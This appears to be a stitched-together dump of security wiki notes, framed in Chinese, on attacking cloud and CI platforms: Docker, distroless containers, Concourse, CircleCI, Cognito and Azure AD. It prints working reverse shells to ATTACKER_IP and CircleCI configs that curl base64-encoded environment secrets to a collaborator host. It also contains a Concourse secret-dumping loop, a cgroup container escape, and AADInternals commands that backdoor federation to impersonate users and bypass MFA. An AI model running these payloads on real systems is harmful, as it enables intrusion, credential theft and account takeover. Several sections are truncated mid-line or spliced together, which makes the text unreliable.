Red means added and yellow means modified. Use tab to move to the other view and space to collapse/open folders. # 命令 / 载荷 / 操作片段 # 1. 容器 modification 123docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMEScc03e43a052a lamp-wordpress "./run.sh" 2 minutes ago Up 2 minutes 80/tcp wordpress # 2. 容器 modification 1234567891011docker diff wordpressC /varC /var/libC /var/lib/mysqlA /var/lib/mysql/ib_logfile0A /var/lib/mysql/ib_logfile1A /var/lib/mysql/ibdata1A /var/lib/mysql/mysqlA /var/lib/mysql/mysql/time_zone_leap_second.MYIA /var/lib/mysql/mysql/general_log.CSV... # 3. 容器 modification 1docker cp wordpress:/etc/shadow. # 4. 容器 modification 123docker run -d lamp-wordpressdocker cp b5d53e8b468e:/etc/shadow original_shadow #Get the file from the newly created containerdiff original_shadow shadow # 5. 容器 modification 1docker exec -it wordpress bash # 6. Images modifications 1234docker save <image> > image.tar #Export the image to a .tar filecontainer-diff analyze -t sizelayer image.tarcontainer-diff analyze -t history image.tarcontainer-diff analyze -t metadata image.tar # 7. Images modifications 1tar -xf image.tar # 8. Basic Analysis 1docker inspect <image> # 9. Basic Analysis 1docker history --no-trunc <image> # 10. Basic Analysis 12alias dfimage="docker run -v /var/run/docker.sock:/var/run/docker.sock --rm alpine/dfimage"dfimage -sV=1.36 madhuakula/k8s-goat-hidden-in-layers> # 11. Dive 123456#First you need to load the image in your docker reposudo docker load < image.tar 1 ⨯Loaded image: flask:latest#And then open it with dive:sudo dive flask:latest # 12. Dive 12tar -xf image.tarfor d in `find * -maxdepth 0 -type d`; do cd $d; tar -xf ./layer.tar; cd ..; done # 工具与参考入口 容器 - diff dive releases # 检查清单 是否确认账号 / 订阅 / 项目 / 命名空间边界 是否枚举 IAM 权限与资源暴露 是否检查密钥、元数据和审计日志 是否避免跨越非授权云资源 # 关联 云与容器总览 知识地图 容器与 Kubernetes CTF 取证隐写 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/云与容器/Distroless Containers 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Distroless Containers 技术笔记 [!summary] 提炼定位 面向 云与容器 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 评估 Distroless Containers 技术笔记 相关云服务、身份策略、元数据、容器或控制平面风险。 把身份权限、网络暴露、配置漂移、密钥流向和审计日志串成闭环。 # 中文提炼 核心目标是确认 Distroless Containers 技术笔记 涉及的账号、项目 / 订阅、角色、资源和控制平面边界。 优先关注：Distroless Containers、Overview、Why Distroless Exists、What Distroless Does Not Mean、Typical Operational Characteristics；身份权限、元数据、密钥、审计日志和网络暴露要一起看。 验证云权限时使用只读枚举优先，任何资源创建、策略修改或跨账号操作都要单独记录和回滚。 容器 / Kubernetes 场景要区分 Pod 内权限、ServiceAccount、RBAC、节点权限和宿主机逃逸面。 本页已沉淀 7 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Distroless Containers Overview Why Distroless Exists What Distroless Does Not Mean Typical Operational Characteristics Distroless And Post - 利用 Abuse Enumerate The Runtime You Already Have 反弹 Shell Without /bin/sh Full Example: No-Shell Python Command Loop In-Memory Tool Execution Existing Binaries Already In The Image Checks Runtime Defaults Related Pages # 核心要点 the number of packages and binaries that could contain vulnerabilities the number of post - 利用 工具 available to an attacker by default That is why distroless images are popular in production application deployments. A 容器 that contains no shell, no package manager, and almost no generic tooling is usually easier to reason about operationally and harder to abuse interactively after compromise. automatically non-privileged automatically read-only shell-based 载荷 fail because there is no shell common 枚举 one-liners fail because the helper binaries are missing file system protections such as read-only rootfs or noexec on writable tmpfs locations are often present as well recovery of environment variables, often including 凭据 or service endpoints filesystem 枚举 without /bin/ls readOnlyRootFilesystem: true staging 载荷 data through encoded/encrypted blobs If no shell exists but a runtime such as Python or Node is present, post - 利用 should pivot to runtime-driven execution. If the root filesystem is read-only and /dev/shm is writable but noexec, memory execution techniques become much more relevant. # 命令 / 载荷 / 操作片段 # 1. Enumerate The Runtime You Already Have 1234567python3 - <<'PY'import os, socket, subprocessprint("uid", os.getuid())print("cwd", os.getcwd())print("env keys", list(os.environ)[:20])print("root files", os.listdir("/")[:30])PY # 2. Enumerate The Runtime You Already Have 1node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));' # 3. 反弹 Shell Without /bin/sh 12345678python3 - <<'PY'import os,pty,sockets=socket.socket()s.connect(("ATTACKER_IP",4444))for fd in (0,1,2): os.dup2(s.fileno(),fd)pty.spawn("/bin/sh")PY # 4. 反弹 Shell Without /bin/sh 1node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});' # 5. Full Example: No-Shell Python Command Loop 12345678910python3 - <<'PY'import os,subprocesswhile True: cmd=input("py> ") if cmd.strip() in ("exit","quit"): break p=subprocess.run(cmd, shell=True, capture_output=True, text=True) print(p.stdout, end="") print(p.stderr, end="")PY # 6. Existing Binaries Already In The Image 1find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null # 7. For 认证 it's possible to enable SSH through username and 密码 (密码 defined when the droplet is created). Or select one or more of the uploaded SSH keys. By default droplets are created WITHOUT A FIREWALL (not like in oder clouds such as AWS or GCP). So if you want DO to protect the ports of the droplet (VM), you need to create it and attach it. Droplets have metadata endpoints, but in DO there isn't IAM or things such as role from AWS or service accounts from GCP. With access to the console it's possible to get a shell inside the droplet accessing the URL: https://cloud.digitalocean.com/droplets/<droplet-id>/terminal/ui/ It's also possible to launch a recovery console to run commands inside the host accessing a recovery console in https://cloud.digitalocean.com/droplets/<droplet-id>/console (but in this case you will need to know the root 密码). # 检查清单 是否确认账号 / 订阅 / 项目 / 命名空间边界 是否枚举 IAM 权限与资源暴露 是否检查密钥、元数据和审计日志 是否避免跨越非授权云资源 # 关联 云与容器总览 知识地图 Pwn 基础链路 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Basically all members of a team have access to the DO resources in all the projects created within the team (with more or less privileges). As in most of the platforms, in order to access to the GUI you can use a set of valid username and 密码 to access the cloud resources. Once logged in you can see all the teams you are part of in https://cloud.digitalocean.com/account/profile.\ In order to use the API, users can generate API keys. These will always come with Read permissions but Write permission are optional.\ The cli tool is doctl. Initialise it (you need a 令牌) with: # 命令 / 载荷 / 操作片段 # 1. API keys 1[REDACTED_DIGITALOCEAN_TOKEN] # 2. API keys 123doctl auth init # Asks for the tokendoctl auth init --context my-context # Login with a different tokendoctl auth list # List accounts # 3. Spaces access keys 123Name: key-exampleKeyid: DO00ZW4FABSGZHAABGFXSecret: [REDACTED_SECRET] # 4. Functions 认证 令牌 123curl -X POST "https://faas-lon1-129376a7.doserverless.co/api/v1/namespaces/fn-c100c012-65bf-4040-1230-2183764b7c23/actions/functionname?blocking=true&result=true" \ -H "Content-Type: application/json" \ -H "Authorization: Basic [REDACTED_SECRET]" # 工具与参考入口 https://cloud.digitalocean.com/account/profile https://cloud.digitalocean.com/account/activity doctl https://cloud.digitalocean.com/account/api/applications https://cloud.digitalocean.com/account/api/access https://cloud.digitalocean.com/account/security uploaded SSH keys aren't set in already existent droplets for security reasons https://docs.digitalocean.com/products/teams/how-to/manage-membership/ # 检查清单 是否确认账号 / 订阅 / 项目 / 命名空间边界 是否枚举 IAM 权限与资源暴露 是否检查密钥、元数据和审计日志 是否避免跨越非授权云资源 # 关联 云与容器总览 知识地图 云身份与权限 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Moreover, the permissions of the roles owner, member, pipeline-operator and viewer can be modified configuring RBAC (configuring more specifically it's actions). Read more about it in: https://concourse-ci.org/user-roles.html From the docs: The source-name is optional, and if omitted, the cluster-wide credential manager will be used, or the value may be provided statically.\ The optional \ secret-field\ specifies a field on the fetched secret to read. If omitted, the credential manager may choose to read a 'default field' from the fetched credential if the field exists.\ There are different ways a Credential Manager can be specified in a pipeline, read how in https://concourse-ci.org/creds.html.\ The Vault credential manager The CredHub credential manager The AWS SSM credential manager The AWS Secrets Manager credential manager Kubernetes Credential Manager The Conjur credential manager Caching 凭据 Redacting 凭据 # 命令 / 载荷 / 操作片段 # 1. Static Vars 123- task: unit-1.13 file: booklit/ci/unit.yml vars: { tag: 1.13 } # 2. Pipelines 12345678910rm /tmp/secrets.txt;for pipename in $(fly -t onelogin pipelines | grep -Ev "^id" | awk '{print $2}'); do echo $pipename; fly -t onelogin get-pipeline -p $pipename | grep -Eo '\(\(.*\)\)' | sort | uniq | tee -a /tmp/secrets.txt; echo "";doneecho ""echo "ALL SECRETS"cat /tmp/secrets.txt | sort | uniqrm /tmp/secrets.txt # 3. Session inside running or recently run 容器 12fly -t tutorial intercept --job pipeline-name/job-namefly -t tutorial intercept # To be presented a prompt with all the options # 4. Pipeline Creation/Modification 123456789101112131415161718192021jobs: - name: simple plan: - task: simple-task privileged: true config: # Tells Concourse which type of worker this task should run on platform: linux image_resource: type: registry-image source: repository: busybox # images are pulled from docker hub by default run: path: sh args: - -cx - | echo "$SUPER_SECRET" sleep 1000 params: SUPER_SECRET: ((super.secret)) # 5. Execute Custom Task 123456789101112131415# For more task_config options check https://concourse-ci.org/tasks.htmlplatform: linuximage_resource: type: registry-image source: repository: ubunturun: path: sh args: - -cx - | env sleep 1000params: SUPER_SECRET: ((super.secret)) # 6. Execute Custom Task 1fly -t tutorial execute --privileged --config task_config.yml # 7. Escaping to the node from privileged task 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455# Mounts the RDMA cgroup controller and create a child cgroup# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"# It's because your setup doesn't have the memory cgroup controller, try change memory to rdma to fix itmkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x# Enables cgroup notifications on release of the "x" cgroupecho 1 > /tmp/cgrp/x/notify_on_release# CHANGE ME# The host path will look like the following, but you need to change it:host_path="/mnt/vda1/hostpath-provisioner/default/concourse-work-dir-concourse-release-worker-0/overlays/ae7df0ca-0b38-4c45-73e2-a9388dcb2028/rootfs"## The initial path "/mnt/vda1" is probably the same, but you can check it using the mount command:#/dev/vda1 on /scratch type ext4 (rw,relatime)#/dev/vda1 on /tmp/build/e55deab7 type ext4 (rw,relatime)#/dev/vda1 on /etc/hosts type ext4 (rw,relatime)#/dev/vda1 on /etc/resolv.conf type ext4 (rw,relatime)## Then next part I think is constant "hostpath-provisioner/default/&quo

Customized workflows and user migration through AWS Lambda triggers. User 枚举: The registration functionality can be used to find usernames that already exists. This information can be useful for the brute-force attack. Login brute-force: In the 认证 section you have all the methods that a user have to login, you could try to brute-force them find valid 凭据. Cognito Scanner is a CLI tool in python that implements different attacks on Cognito including unwanted account creation and account oracle. Check this link for more info. CognitoAttributeEnum: This script allows to enumerate valid attributes for users. The ID 令牌 is the 令牌 that contains the attributes values of the user, even the custom ones. After the server-side app has the 认证 parameters, it calls the AdminRespondToAuthChallenge API operation. The AdminRespondToAuthChallenge API operation only succeeds when you provide AWS 凭据. # 命令 / 载荷 / 操作片段 # 1. 工具 for pentesting 1234567# Run cognito__enum usage to gather all user pools, user pool clients, identity pools, users, etc. visible in the current AWS accountPacu (new:test) > run cognito__enum# cognito__attack usage to attempt user creation and all privesc vectors against a given identity pool and user pool client:Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_poolsus-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX # 2. 工具 for pentesting 1234# Installpip install cognito-scanner# Runcognito-scanner --help # 3. 工具 for pentesting 1python cognito-attribute-enu.py -client_id 16f1g98bfuj9i0g3f8be36kkrl # 4. Registration 123aws cognito-idp sign-up --client-id <client-id> \ --username <username> --password <password> \ --region <region> --no-sign-request # 5. If anyone can register 1An error occurred (InvalidParameterException) when calling the SignUp operation: Attributes did not conform to the schema: address: The attribute is required # 6. If anyone can register 1--user-attributes '[{"Name": "email", "Value": "carlospolop@gmail.com"}, {"Name":"gender", "Value": "M"}, {"Name": "address", "Value": "street"}, {"Name": "custom:custom_name", "Value":"supername&\"*$"}]' # 7. If anyone can register 1An error occurred (UsernameExistsException) when calling the SignUp operation: User already exists # 8. If anyone can register 1An error occurred (ResourceNotFoundException) when calling the SignUp operation: User pool client 3ig612gjm56p1ljls1prq2miut does not exist. # 9. If only admin can register users 1An error occurred (NotAuthorizedException) when calling the SignUp operation: SignUp is not permitted for this user pool # 10. Verifying Registration 123aws cognito-idp confirm-sign-up --client-id <cliet_id> \ --username aasdasd2 --confirmation-code <conf_code> \ --no-sign-request --region us-east-1 # 11. 权限提升 / Updating Attributes 1234aws cognito-idp update-user-attributes \ --region us-east-1 --no-sign-request \ --user-attributes Name=address,Value=street \ --access-token <access token> # 12. Email/username modification privesc 1234aws cognito-idp verify-user-attribute \ --access-token <access_token> \ --attribute-name email --code <code> \ --region <region> --no-sign-request # 13. Recover/Change 密码 123aws cognito-idp forgot-password \ --client-id <client_id> \ --username <username/email/phone> --region <region> # 14. Recover/Change 密码 12345aws cognito-idp confirm-forgot-password \ --client-id <client_id> \ --username <username> \ --confirmation-code <conf_code> \ --pas

content: 来源路径： 02-知识点/云与容器/CircleCI Security 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # CircleCI Security 技术笔记 [!summary] 提炼定位 面向 云与容器 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 评估 CircleCI Security 技术笔记 相关云服务、身份策略、元数据、容器或控制平面风险。 把身份权限、网络暴露、配置漂移、密钥流向和审计日志串成闭环。 # 中文提炼 核心目标是确认 CircleCI Security 技术笔记 涉及的账号、项目 / 订阅、角色、资源和控制平面边界。 优先关注：CircleCI Security、Basic Information、Permissions、Env Variables & Secrets、Built-in env variables；身份权限、元数据、密钥、审计日志和网络暴露要一起看。 验证云权限时使用只读枚举优先，任何资源创建、策略修改或跨账号操作都要单独记录和回滚。 容器 / Kubernetes 场景要区分 Pod 内权限、ServiceAccount、RBAC、节点权限和宿主机逃逸面。 本页已沉淀 9 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 CircleCI Security Basic Information Permissions Env Variables & Secrets Built-in env variables Clear text Project Secrets Context Secrets Attacks Search Clear Text Secrets Secret Env Vars & Context 枚举 Exfiltrate Project secrets Exfiltrate Context Secrets Escape to Cloud 持久化 # 核心要点 In my testing I checked that as long as you have write permissions over the repo in github, you are going to be able to manage its project settings in CircleCI (set new ssh keys, get project api keys, create new branches with new CircleCI configs...). In order to exfiltrate ALL the project and context SECRETS you just need to have WRITE access to just 1 repo in the whole github org ( and your account must have access to the contexts but by default everyone can access every context ). The "Import Variables" functionality allows to import variables from other projects to this one. Therefore, an attacker could import all the project variables from all the repos and then exfiltrate all of them together. Notice that in the previous examples it was launched everything inside a Docker 容器，but you can also ask to launch a VM machine (which may have different cloud permissions): Or even a Docker 容器 with access to a remote Docker service: It's possible to create user tokens in CircleCI to access the API endpoints with the users access. https://app.circleci.com/settings/user/tokens It's possible to create projects tokens to access the project with the permissions given to the 令牌. You can find a 命令注入 漏洞 in some task and inject commands via a secret modifying its value # 命令 / 载荷 / 操作片段 # 1. Clear text 12345- run: name: "set and echo" command: | SECRET="A secret" echo $SECRET # 2. Clear text 12345- run: name: "set and echo" command: echo $SECRET environment: SECRET: A secret # 3. Clear text 123456jobs: build-job: docker: - image: cimg/base:2020.01 environment: SECRET: A secret # 4. Exfiltrate Project secrets 12345678910111213141516version: 2.1jobs: exfil-env: docker: - image: cimg/base:stable steps: - checkout - run: name: "Exfil env" command: "env | base64"workflows: exfil-env-workflow: jobs: - exfil-env # 5. Exfiltrate Project secrets 123456789101112131415161718192021222324version: 2.1jobs: exfil-env: docker: - image: cimg/base:stable steps: - checkout - run: name: "Exfil env" command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"# I filter by the repo branch where this config.yaml file is located: circleci-project-setupworkflows: exfil-env-workflow: triggers: - schedule: cron: "* * * * *" filters: branches: only: - circleci-project-setup jobs: - exfil-env # 6. Exfiltrate Context Secrets 1234567891011121314151617version: 2.1jobs: exfil-env: docker: - image: cimg/base:stable steps: - checkout - run: name: "Exfil env" command: "env | base64"workflows: exfil-env-workflow: jobs: - exfil-env: context: Test-Context # 7. Exfiltrate Context Secrets 12345678910111213141516171819202122232425version: 2.1jobs: exfil-env: docker: - image: cimg/base:stable steps: - checkout - run: name: "Exfil env" command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"# I filter by the repo branch where this config.yaml file is located: circleci-project-setupworkflows: exfil-env-workflow: triggers: - schedule: cron: "* * * * *" filters: branches: only: - circleci-project-setup jobs: - exfil-env: context: Test-Context # 8. Escape to Cloud 123456jobs: exfil-env: #docker: # - image: cimg/base:stable machine: image: ubuntu-2004:current # 9. Escape to Cloud 12345678jobs: exfil-env: docker: - image: cimg/base:stable steps: - checkout - setup_remote_docker: version: 19.03.13 # 工具与参考入口 CircleCI the docs specific env vars defined in the documentation # 检查清单 是否确认账号 / 订阅 / 项目 / 命名空间边界 是否枚举 IAM 权限与资源暴露 是否检查密钥、元数据和审计日志 是否避免跨越非授权云资源 # 关联 云与容器总览 知识地图 云身份与权限 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Known default observed in the wild: Injection point: filters[].type 漏洞 class: time-based blind SQL 注入 in PostgreSQL Log and alert on usage of x-data-collector - 令牌，especially known default values, across API paths Rotate/disable default data collector tokens Restrict ingress to data collector endpoints; enforce strong, unique tokens Check if x-data-collector - 令牌 is accepted and whether the known default works Map the Compliance API request schema by inducing validation errors and reading error messages/headers # 命令 / 载荷 / 操作片段 # 1. To tag Burp/LLM traffic in logs, add a header rewrite (proxy or Burp Match/Replace): Keep Burp as the source of truth; use the model for analysis and reporting, not scanning. Burp AI Agent is a Burp extension that couples local/cloud LLMs with passive/active analysis (62 漏洞 classes) and exposes 53+ MCP 工具 so external MCP clients can orchestrate Burp. Highlights: Agent profiles: prompt templates auto-installed under ~/.burp-ai-agent/AGENTS/; drop extra *.md files there to add custom analysis/scanning behaviors. Audit logging: JSONL logs with per-entry SHA-256 integrity hashing for tamper-evident traceability of AI/MCP actions. Build/load: 下载 the release JAR or build with Java 21: # 命令 / 载荷 / 操作片段 # 1. Configure an MCP client (Codex example) 1234# ~/.codex/config.toml[mcp_servers.burp]command = "java"args = ["-jar", "/absolute/path/to/mcp-proxy.jar", "--sse-url", "http://127.0.0.1:19876"] # 2. Configure an MCP client (Codex example) 12codex# inside Codex: /mcp # 3. Fix strict Origin/header validation with Caddy (if needed) 1234567891011121314151617brew install caddymkdir -p ~/burp-mcpcat >~/burp-mcp/Caddyfile <<'EOF':19876reverse_proxy 127.0.0.1:9876 { # lock Host/Origin to the Burp listener header_up Host "127.0.0.1:9876" header_up Origin "http://127.0.0.1:9876" # strip client headers that trigger Burp's 403 during SSE init header_up -User-Agent header_up -Accept header_up -Accept-Encoding header_up -Connection}EOF # 4. Fix strict Origin/header validation with Caddy (if needed) 12caddy run --config ~/burp-mcp/Caddyfile &codex # 5. Gemini CLI 12source /path/to/burp-mcp-agents/gemini-cli/burpgemini.shburpgemini # 6. PortSwigger/Burp Suite：The class-leading 漏洞 scanning, penetration testing, and web app security platform. For instance, they might submit thousands of username and 密码 combinations or guess security tokens by iterating through a range, such as 0 to 10,000. This method can lead to unauthorized access and data breaches if not mitigated effectively. Countermeasures like rate limiting, account lockout policies, CAPTCHA, and strong 密码 requirements are essential to protect web applications from such brute-force attacks. Sniper attack: target a single position (one variable) while cycling through one 载荷 set. Battering ram attack: send the same 载荷 to all marked positions at once by using a single 载荷 set. Pitchfork attack: use different 载荷 lists in parallel, combining the nth entry from each list into one request. Cluster bomb attack: iterate through all combinations of multiple 载荷 sets. # 命令 / 载荷 / 操作片段 # 1. title: Az：枚举 工具
content: 来源路径： 02-知识点/云与容器/Az：枚举 工具.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Az：枚举 工具 [!summary] 提炼定位 面向 云与容器 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 评估 Az：枚举 工具 相关云服务、身份策略、元数据、容器或控制平面风险。 把身份权限、网络暴露、配置漂移、密钥流向和审计日志串成闭环。 # 中文提炼 核心目标是确认 Az：枚举 工具 涉及的账号、项目 / 订阅、角色、资源和控制平面边界。 优先关注：Install PowerShell in Linux、Install PowerShell in MacOS、Main 枚举 工具、az cli、Debug | MitM az cli；身份权限、元数据、密钥、审计日志和网络暴露要一起看。 验证云权限时使用只读枚举优先，任何资源创建、策略修改或跨账号操作都要单独记录和回滚。 容器 / Kubernetes 场景要区分 Pod 内权限、ServiceAccount、RBAC、节点权限和宿主机逃逸面。 本页已沉淀 32 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Install PowerShell in Linux Install PowerShell in MacOS Main 枚举 工具 az cli Debug | MitM az cli Why the error happens Step-by-step: working configuration Prereqs Create a standards-compliant Burp CA (PEM + KEY) Convert to PKCS#12 (Burp import format) Import the CA into Burp and restart Burp Trust the new CA in macOS system keychain Configure proxy env vars Configure Requests/Azure CLI to trust your Burp CA Verify Burp is actually signing with your new CA (critical check) Verify Python Requests works through Burp Azure CLI test Az PowerShell # 核心要点 In linux you will need to install PowerShell Core: Install the latest stable release of PowerShell: Azure Command-Line Interface (CLI) is a cross-platform tool written in Python for managing and administering (most) Azure and Entra ID resources. It connects to Azure and executes administrative commands via the command line or scripts. Commands in Azure CLI are structured using a pattern of: az <service> <action> <parameters> When Azure CLI authenticates, it makes HTTPS requests (via MSAL → Requests → OpenSSL). If you’re intercepting TLS with Burp, Burp generates “on the fly” certificates for sites like login.microsoftonline.com and signs them with Burp’s CA. A CA certificate must include Basic Constraints: CA:TRUE and a Key Usage extension permitting certificate signing (keyCertSign, and typically cRLSign). CERTIFICATE VERIFY FAILED self-signed certificate in certificate chain Azure CLI installed (Homebrew) Key Usage: ... Certificate Sign, CRL Sign Find Import / export CA certificate Click Import CA certificate Enter the 密码 You typically do not need the old ADAL PYTHON SSL NO VERIFY / AZURE CLI DISABLE CONNECTION VERIFICATION once the CA is correct. # 命令 / 载荷 / 操作片段 # 1. Install PowerShell in Linux 12345678910111213141516sudo apt-get updatesudo apt-get install -y wget apt-transport-https software-properties-common# Ubuntu 20.04wget -q https://packages.microsoft.com/config/ubuntu/20.04/packages-microsoft-prod.deb# Update repossudo apt-get updatesudo add-apt-repository universe# Install & start powershellsudo apt-get install -y powershellpwsh# Az clicurl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash # 2. Install PowerShell in MacOS 1/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" # 3. Install PowerShell in MacOS 1brew install powershell/tap/powershell # 4. Install PowerShell in MacOS 1pwsh # 5. Install PowerShell in MacOS 12brew updatebrew upgrade powershell # 6. Debug | MitM az cli 1az account management-group list --output table --debug # 7. Debug | MitM az cli 12345678910export ADAL_PYTHON_SSL_NO_VERIFY=1export AZURE_CLI_DISABLE_CONNECTION_VERIFICATION=1export HTTPS_PROXY="http://127.0.0.1:8080"export HTTP_PROXY="http://127.0.0.1:8080"# If this is not enough# Download the certificate from Burp and convert it into .pem format# And export the following env variableopenssl x509 -in ~/Downloads/cacert.der -inform DER -out ~/Downloads/cacert.pem -outform PEMexport REQUESTS_CA_BUNDLE=/Users/user/Downloads/cacert.pem # 8. Debug | MitM az cli 12345678910set ADAL_PYTHON_SSL_NO_VERIFY=1set AZURE_CLI_DISABLE_CONNECTION_VERIFICATION=1set HTTPS_PROXY="http://127.0.0.1:8080"set HTTP_PROXY="http://127.0.0.1:8080"# If this is not enough# Download the certificate from Burp and convert it into .pem format# And export the following env variableopenssl x509 -in cacert.der -inform DER -out cacert.pem -outform PEMset REQUESTS_CA_BUNDLE=C:\Users\user\Downloads\cacert.pem # 9. Debug | MitM az cli 1234$env:ADAL_PYTHON_SSL_NO_VERIFY=1$env:AZURE_CLI_DISABLE_CONNECTION_VERIFICATION=1$env:HTTPS_PROXY="http://127.0.0.1:8080"$env:HTTP_PROXY="http://127.0.0.1:8080" # 10. Create a standards-compliant Burp CA (PEM + KEY) 123456789101112131415161718192021mkdir -p ~/burp-ca && cd ~/burp-cacat > burp-ca.cnf <<'EOF'[ req ]default_bits = 2048prompt = nodefault_md = sha256distinguished_name = dnx509_extensions = v3_ca[ dn ]C = USO = Burp Custom CACN = Burp Custom Root CA[ v3_ca ]basicConstraints = critical,CA:TRUEkeyUsage = critical,keyCertSign,cRLSignsubjectKeyIdentifier = hashauthorityKeyIdentifier = keyid:always,issuerEOF # 11. Create a standards-compliant Burp CA (PEM + KEY) 12345openssl req -x509 -new -nodes \ -days 3650 \ -keyout burp-ca.key \ -out burp-ca.pem \ -config burp-ca

An interesting role to add to the application would be Privileged 认证 administrator role as it allows to reset 密码 of Global Administrators. This technique also allows to 绕过 MFA. For certificate based 认证 With DA privileges on on-prem AD, it is possible to create and import new 令牌 signing and 令牌 Decrypt certificates that have a very long validity. This will allow us to log-in as any user whose ImuutableID we know. Run the below command as DA on the ADFS server(s) to create new certs (default 密码 'AADInternals'), add them to ADFS, disable auto rollver and restart the service: # 命令 / 载荷 / 操作片段 # 1. Applications and Service Principals 123$passwd = ConvertTo-SecureString "J~Q~QMt_qe4uDzg53MDD_jrj_Q3P.changed" -AsPlainText -Force$creds = New-Object System.Management.Automation.PSCredential("311bf843-cc8b-459c-be24-6ed908458623", $passwd)Connect-AzAccount -ServicePrincipal -Credential $credentials -Tenant e12984235-1035-452e-bd32-ab4d72639a # 2. Applications and Service Principals 1Connect-AzAccount -ServicePrincipal -Tenant <TenantId> -CertificateThumbprint <Thumbprint> -ApplicationId <ApplicationId> # 3. Federation：令牌 Signing Certificate 1New-AADIntADFSSelfSignedCertificates # 4. Federation：令牌 Signing Certificate 1Update-AADIntADFSFederationSettings -Domain cyberranges.io # 5. Federation：Trusted Domain 12345678# Using AADInternalsConvertTo-AADIntBackdoor -DomainName cyberranges.io# Get ImmutableID of the user that we want to impersonate. Using Msol moduleGet-MsolUser | select userPrincipalName,ImmutableID# Access any cloud app as the userOpen-AADIntOffice365Portal -ImmutableID qIMPTm2Q3kimHgg4KQyveA== -Issuer "http://any.sts/B231A11F" -UseBuiltInCertificate -ByPassMFA$true # 工具与参考入口 https://aadinternalsbackdoor.azurewebsites.net/ # 检查清单 是否确认账号 / 订阅 / 项目 / 命名空间边界 是否枚举 IAM 权限与资源暴露 是否检查密钥、元数据和审计日志 是否避免跨越非授权云资源 # 关联 云与容器总览 知识地图 AD CS 证书攻击 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/云与容器/Az：容器 Registry.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Az：容器 Registry [!summary] 提炼定位 面向 云与容器 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 评估 Az：容器 Registry 相关云服务、身份策略、元数据、容器或控制平面风险。 把身份权限、网络暴露、配置漂移、密钥流向和审计日志串成闭环。 # 中文提炼 核心目标是确认 Az：容器 Registry 涉及的账号、项目 / 订阅、角色、资源和控制平面边界。 优先关注：Basic Information、Permissions、认证、Encryption、Networking；身份权限、元数据、密钥、审计日志和网络暴露要一起看。 验证云权限时使用只读枚举优先，任何资源创建、策略修改或跨账号操作都要单独记录和回滚。 容器 / Kubernetes 场景要区分 Pod 内权限、ServiceAccount、RBAC、节点权限和宿主机逃逸面。 本页已沉淀 3 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Basic Information Permissions 认证 Encryption Networking Microsoft Defender for Cloud Soft-delete Webhooks Connected registries Runs & Tasks Cache 枚举 Unauthenticated Access 权限提升 & 后渗透 # 核心要点 With a Service Principal: It's possible to create a service principal and assign a role like AcrPull to pull images. Then, it'll be possible to login to the registry using the SP appId as username and a generated secret as 密码. This allows you to scan the images in the registry for vulnerabilities. From an attackers perspective it's interesting to check this before performing any action in the registry, and remove it terporarely if needed, to avoid being detected. It has 2 modes: ReadOnly and ReadWrite. In the first one, the images are only pulled from the source registry, and in the second one, images can also be pushed to the source registry. In order for clients to access the registry from Azure, a 令牌 is generated when the conected registry is used. Runs & Tasks allows to execute in Azure 容器 related actions that you typically needed to do locally or in a CI/CD pipeline. For example, you can build, push, and run images in the registry. # 命令 / 载荷 / 操作片段 # 1. 认证 123456789101112#!/bin/bashACR_NAME=$containerRegistrySERVICE_PRINCIPAL_NAME=$servicePrincipal# Obtain the full registry IDACR_REGISTRY_ID=$(az acr show --name $ACR_NAME --query "id" --output tsv)PASSWORD=$(az ad sp create-for-rbac --name $SERVICE_PRINCIPAL_NAME --scopes $ACR_REGISTRY_ID --role acrpull --query "password" --output tsv)USER_NAME=$(az ad sp list --display-name $SERVICE_PRINCIPAL_NAME --query "[].appId" --output tsv)echo "Service principal ID: $USER_NAME"echo "Service principal password: $PASSWORD" # 2. Runs & Tasks 123456# Buildecho "FROM mcr.microsoft.com/hello-world" > 